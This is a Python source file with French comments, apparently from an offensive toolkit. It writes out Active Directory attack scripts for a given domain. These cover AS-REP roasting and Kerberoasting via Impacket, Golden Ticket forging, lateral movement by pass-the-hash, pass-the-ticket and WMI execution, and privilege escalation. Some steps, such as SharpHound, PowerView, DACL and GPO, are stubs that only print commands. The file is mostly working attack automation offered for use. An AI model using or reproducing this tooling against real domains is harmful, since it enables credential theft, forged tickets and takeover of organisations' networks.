#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🏢 ACTIVE DIRECTORY - Module d'attaque Active Directory
Kerberos attacks, Golden Ticket, BloodHound, PowerView
"""

import os
import subprocess
import threading
import time
import json
import requests
import base64
import hashlib
from datetime import datetime

class ActiveDirectoryAttacks:
    def __init__(self):
        self.ad_attacks = []
        self.active_attacks = []
        
    def kerberos_attack(self, target_domain, user_list):
        """Attaques Kerberos avancées"""
        print(f"🎭 Attaque Kerberos: {target_domain}")
        
        try:
            ad_dir = "ad_attacks"
            os.makedirs(ad_dir, exist_ok=True)
            
            attack_name = f"kerberos_attack_{target_domain}_{int(time.time())}"
            attack_file = os.path.join(ad_dir, f"{attack_name}.py")
            
            # Techniques Kerberos
            kerberos_techniques = {
                'as_req_roasting': 'AS-REQ Roasting',
                'kerberoasting': 'Kerberoasting',
                'golden_ticket': 'Golden Ticket',
                'silver_ticket': 'Silver Ticket',
                'pass_the_ticket': 'Pass the Ticket',
                'overpass_the_hash': 'Overpass the Hash'
            }
            
            attack_code = f'''#!/usr/bin/env python3
import subprocess
import json
import time
from datetime import datetime

class KerberosAttacker:
    def __init__(self):
        self.target_domain = "{target_domain}"
        self.user_list = {user_list}
        self.results = []
        
    def as_req_roasting(self):
        """AS-REQ Roasting attack"""
        print(f"[+] AS-REQ Roasting sur {{self.target_domain}}")
        
        try:
            # Utiliser GetNPUsers.py (Impacket)
            cmd = f"python3 GetNPUsers.py {{self.target_domain}}/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[+] AS-REQ Roasting réussi")
                return True
            else:
                print(f"[-] Erreur AS-REQ Roasting: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur AS-REQ Roasting: {{e}}")
            return False
            
    def kerberoasting(self):
        """Kerberoasting attack"""
        print(f"[+] Kerberoasting sur {{self.target_domain}}")
        
        try:
            # Utiliser GetUserSPNs.py (Impacket)
            cmd = f"python3 GetUserSPNs.py {{self.target_domain}}/ -request -outputfile kerberoast_hashes.txt"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[+] Kerberoasting réussi")
                return True
            else:
                print(f"[-] Erreur Kerberoasting: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur Kerberoasting: {{e}}")
            return False
            
    def golden_ticket_attack(self, krbtgt_hash):
        """Golden Ticket attack"""
        print(f"[+] Golden Ticket attack")
        
        try:
            # Utiliser ticketer.py (Impacket)
            cmd = f"python3 ticketer.py -nthash {{krbtgt_hash}} -domain {{self.target_domain}} -spn krbtgt/{{self.target_domain}} administrator"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[+] Golden Ticket créé")
                return True
            else:
                print(f"[-] Erreur Golden Ticket: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur Golden Ticket: {{e}}")
            return False
            
    def run_kerberos_attacks(self):
        """Lance toutes les attaques Kerberos"""
        print(f"[+] Début attaques Kerberos {{self.target_domain}}")
        
        # AS-REQ Roasting
        if self.as_req_roasting():
            self.results.append({{'technique': 'as_req_roasting', 'status': 'success'}})
            
        # Kerberoasting
        if self.kerberoasting():
            self.results.append({{'technique': 'kerberoasting', 'status': 'success'}})
            
        # Golden Ticket (si hash disponible)
        # if self.golden_ticket_attack(krbtgt_hash):
        #     self.results.append({{'technique': 'golden_ticket', 'status': 'success'}})
            
        print(f"[+] Attaques Kerberos terminées: {{len(self.results)}} succès")
        return self.results

if __name__ == "__main__":
    attacker = KerberosAttacker()
    results = attacker.run_kerberos_attacks()
'''
            
            with open(attack_file, 'w', encoding='utf-8') as f:
                f.write(attack_code)
            
            attack_info = {
                'name': attack_name,
                'target_domain': target_domain,
                'file': attack_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'kerberos_attack'
            }
            
            self.ad_attacks.append(attack_info)
            print(f"✅ Attaque Kerberos créée: {attack_file}")
            return attack_file
            
        except Exception as e:
            print(f"❌ Erreur création attaque Kerberos: {e}")
            return None
    
    def bloodhound_integration(self, target_domain):
        """Intégration BloodHound"""
        print(f"🩸 Intégration BloodHound: {target_domain}")
        
        try:
            ad_dir = "ad_attacks"
            os.makedirs(ad_dir, exist_ok=True)
            
            bloodhound_name = f"bloodhound_{target_domain}_{int(time.time())}"
            bloodhound_file = os.path.join(ad_dir, f"{bloodhound_name}.py")
            
            bloodhound_code = f'''#!/usr/bin/env python3
import subprocess
import json
import time
from datetime import datetime

class BloodHoundCollector:
    def __init__(self):
        self.target_domain = "{target_domain}"
        self.collection_methods = []
        
    def collect_with_sharphound(self):
        """Collecte avec SharpHound"""
        print(f"[+] Collecte SharpHound sur {{self.target_domain}}")
        
        try:
            # SharpHound commandes
            commands = [
                f"SharpHound.exe -c All -d {{self.target_domain}}",
                f"SharpHound.exe -c Group,Computer,User -d {{self.target_domain}}",
                f"SharpHound.exe -c ACL -d {{self.target_domain}}",
                f"SharpHound.exe -c GPOLocalGroup -d {{self.target_domain}}"
            ]
            
            for cmd in commands:
                print(f"[+] Exécution: {{cmd}}")
                # En vrai, exécuter la commande
                time.sleep(1)
                
            print("[+] Collecte SharpHound terminée")
            return True
            
        except Exception as e:
            print(f"[-] Erreur SharpHound: {{e}}")
            return False
            
    def collect_with_powerview(self):
        """Collecte avec PowerView"""
        print(f"[+] Collecte PowerView sur {{self.target_domain}}")
        
        try:
            # PowerView commandes
            powerview_commands = [
                "Get-Domain",
                "Get-DomainUser",
                "Get-DomainComputer",
                "Get-DomainGroup",
                "Get-DomainPolicy",
                "Get-DomainTrust",
                "Get-DomainController"
            ]
            
            for cmd in powerview_commands:
                print(f"[+] PowerView: {{cmd}}")
                # En vrai, exécuter dans PowerShell
                time.sleep(0.5)
                
            print("[+] Collecte PowerView terminée")
            return True
            
        except Exception as e:
            print(f"[-] Erreur PowerView: {{e}}")
            return False
            
    def import_to_bloodhound(self, json_files):
        """Import dans BloodHound"""
        print(f"[+] Import dans BloodHound")
        
        try:
            # Simuler l'import
            for json_file in json_files:
                print(f"[+] Import: {{json_file}}")
                
            print("[+] Import BloodHound terminé")
            return True
            
        except Exception as e:
            print(f"[-] Erreur import BloodHound: {{e}}")
            return False
            
    def run_bloodhound_collection(self):
        """Lance la collecte BloodHound complète"""
        print(f"[+] Début collecte BloodHound {{self.target_domain}}")
        
        # Collecte SharpHound
        if self.collect_with_sharphound():
            self.collection_methods.append('sharphound')
            
        # Collecte PowerView
        if self.collect_with_powerview():
            self.collection_methods.append('powerview')
            
        # Import BloodHound
        json_files = ['computers.json', 'users.json', 'groups.json', 'acls.json']
        if self.import_to_bloodhound(json_files):
            self.collection_methods.append('bloodhound_import')
            
        print(f"[+] Collecte BloodHound terminée: {{len(self.collection_methods)}} méthodes")
        return self.collection_methods

if __name__ == "__main__":
    collector = BloodHoundCollector()
    results = collector.run_bloodhound_collection()
'''
            
            with open(bloodhound_file, 'w', encoding='utf-8') as f:
                f.write(bloodhound_code)
            
            bloodhound_info = {
                'name': bloodhound_name,
                'target_domain': target_domain,
                'file': bloodhound_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'bloodhound_integration'
            }
            
            self.ad_attacks.append(bloodhound_info)
            print(f"✅ Intégration BloodHound créée: {bloodhound_file}")
            return bloodhound_file
            
        except Exception as e:
            print(f"❌ Erreur création intégration BloodHound: {e}")
            return None
    
    def lateral_movement(self, target_domain, compromised_hosts):
        """Mouvement latéral automatisé"""
        print(f"🔄 Mouvement latéral: {target_domain}")
        
        try:
            ad_dir = "ad_attacks"
            os.makedirs(ad_dir, exist_ok=True)
            
            lateral_name = f"lateral_movement_{target_domain}_{int(time.time())}"
            lateral_file = os.path.join(ad_dir, f"{lateral_name}.py")
            
            lateral_code = f'''#!/usr/bin/env python3
import subprocess
import json
import time
from datetime import datetime

class LateralMovement:
    def __init__(self):
        self.target_domain = "{target_domain}"
        self.compromised_hosts = {compromised_hosts}
        self.movement_path = []
        
    def pass_the_hash(self, source_host, target_host, ntlm_hash):
        """Pass the Hash attack"""
        print(f"[+] Pass the Hash: {{source_host}} -> {{target_host}}")
        
        try:
            # Utiliser psexec.py (Impacket)
            cmd = f"python3 psexec.py -hashes {{ntlm_hash}} administrator@{{target_host}}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Pass the Hash réussi: {{target_host}}")
                self.movement_path.append({{'from': source_host, 'to': target_host, 'technique': 'pass_the_hash'}})
                return True
            else:
                print(f"[-] Erreur Pass the Hash: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur Pass the Hash: {{e}}")
            return False
            
    def pass_the_ticket(self, source_host, target_host, ticket_file):
        """Pass the Ticket attack"""
        print(f"[+] Pass the Ticket: {{source_host}} -> {{target_host}}")
        
        try:
            # Utiliser psexec.py avec ticket
            cmd = f"python3 psexec.py -k -ticket {{ticket_file}} administrator@{{target_host}}"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Pass the Ticket réussi: {{target_host}}")
                self.movement_path.append({{'from': source_host, 'to': target_host, 'technique': 'pass_the_ticket'}})
                return True
            else:
                print(f"[-] Erreur Pass the Ticket: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur Pass the Ticket: {{e}}")
            return False
            
    def wmi_execution(self, source_host, target_host, command):
        """WMI Execution"""
        print(f"[+] WMI Execution: {{source_host}} -> {{target_host}}")
        
        try:
            # Utiliser wmiexec.py (Impacket)
            cmd = f"python3 wmiexec.py administrator@{{target_host}} -c '{{command}}'"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] WMI Execution réussi: {{target_host}}")
                self.movement_path.append({{'from': source_host, 'to': target_host, 'technique': 'wmi_execution'}})
                return True
            else:
                print(f"[-] Erreur WMI Execution: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur WMI Execution: {{e}}")
            return False
            
    def run_lateral_movement(self):
        """Lance le mouvement latéral automatisé"""
        print(f"[+] Début mouvement latéral {{self.target_domain}}")
        
        # Parcourir les hôtes compromis
        for i, host in enumerate(self.compromised_hosts):
            if i < len(self.compromised_hosts) - 1:
                next_host = self.compromised_hosts[i + 1]
                
                # Essayer différentes techniques
                if self.pass_the_hash(host, next_host, "aad3b435b51404eeaad3b435b51404ee"):
                    continue
                elif self.pass_the_ticket(host, next_host, "ticket.kirbi"):
                    continue
                elif self.wmi_execution(host, next_host, "whoami"):
                    continue
                    
        print(f"[+] Mouvement latéral terminé: {{len(self.movement_path)}} mouvements")
        return self.movement_path

if __name__ == "__main__":
    lateral = LateralMovement()
    results = lateral.run_lateral_movement()
'''
            
            with open(lateral_file, 'w', encoding='utf-8') as f:
                f.write(lateral_code)
            
            lateral_info = {
                'name': lateral_name,
                'target_domain': target_domain,
                'file': lateral_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'lateral_movement'
            }
            
            self.ad_attacks.append(lateral_info)
            print(f"✅ Mouvement latéral créé: {lateral_file}")
            return lateral_file
            
        except Exception as e:
            print(f"❌ Erreur création mouvement latéral: {e}")
            return None
    
    def privilege_escalation_ad(self, target_domain):
        """Escalade de privilèges AD"""
        print(f"🔓 Escalade privilèges AD: {target_domain}")
        
        try:
            ad_dir = "ad_attacks"
            os.makedirs(ad_dir, exist_ok=True)
            
            escalation_name = f"ad_escalation_{target_domain}_{int(time.time())}"
            escalation_file = os.path.join(ad_dir, f"{escalation_name}.py")
            
            escalation_code = f'''#!/usr/bin/env python3
import subprocess
import json
import time
from datetime import datetime

class ADPrivilegeEscalation:
    def __init__(self):
        self.target_domain = "{target_domain}"
        self.escalation_methods = []
        
    def kerberoasting_escalation(self):
        """Escalade via Kerberoasting"""
        print(f"[+] Escalade Kerberoasting sur {{self.target_domain}}")
        
        try:
            # Collecter SPNs
            cmd = f"python3 GetUserSPNs.py {{self.target_domain}}/ -request"
            
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print("[+] Kerberoasting escalade réussi")
                self.escalation_methods.append('kerberoasting')
                return True
            else:
                print(f"[-] Erreur Kerberoasting escalade: {{result.stderr}}")
                return False
                
        except Exception as e:
            print(f"[-] Erreur Kerberoasting escalade: {{e}}")
            return False
            
    def dacl_escalation(self):
        """Escalade via DACL manipulation"""
        print(f"[+] Escalade DACL sur {{self.target_domain}}")
        
        try:
            # PowerView DACL manipulation
            dacl_commands = [
                "Get-DomainObject -Identity 'Domain Admins' -Properties memberof",
                "Get-DomainObject -Identity 'Enterprise Admins' -Properties memberof",
                "Get-DomainObject -Identity 'Schema Admins' -Properties memberof"
            ]
            
            for cmd in dacl_commands:
                print(f"[+] DACL: {{cmd}}")
                time.sleep(0.5)
                
            print("[+] DACL escalade terminé")
            self.escalation_methods.append('dacl_manipulation')
            return True
            
        except Exception as e:
            print(f"[-] Erreur DACL escalade: {{e}}")
            return False
            
    def gpo_escalation(self):
        """Escalade via GPO manipulation"""
        print(f"[+] Escalade GPO sur {{self.target_domain}}")
        
        try:
            # PowerView GPO manipulation
            gpo_commands = [
                "Get-DomainGPO -Identity '*Admin*'",
                "Get-DomainGPO -Identity '*Policy*'",
                "Get-DomainGPO -Identity '*Security*'"
            ]
            
            for cmd in gpo_commands:
                print(f"[+] GPO: {{cmd}}")
                time.sleep(0.5)
                
            print("[+] GPO escalade terminé")
            self.escalation_methods.append('gpo_manipulation')
            return True
            
        except Exception as e:
            print(f"[-] Erreur GPO escalade: {{e}}")
            return False
            
    def run_ad_escalation(self):
        """Lance l'escalade AD complète"""
        print(f"[+] Début escalade AD {{self.target_domain}}")
        
        # Kerberoasting escalade
        self.kerberoasting_escalation()
        
        # DACL escalade
        self.dacl_escalation()
        
        # GPO escalade
        self.gpo_escalation()
        
        print(f"[+] Escalade AD terminée: {{len(self.escalation_methods)}} méthodes")
        return self.escalation_methods

if __name__ == "__main__":
    escalation = ADPrivilegeEscalation()
    results = escalation.run_ad_escalation()
'''
            
            with open(escalation_file, 'w', encoding='utf-8') as f:
                f.write(escalation_code)
            
            escalation_info = {
                'name': escalation_name,
                'target_domain': target_domain,
                'file': escalation_file,
                'timestamp': datetime.now().isoformat(),
                'type': 'ad_privilege_escalation'
            }
            
            self.ad_attacks.append(escalation_info)
            print(f"✅ Escalade AD créée: {escalation_file}")
            return escalation_file
            
        except Exception as e:
            print(f"❌ Erreur création escalade AD: {e}")
            return None 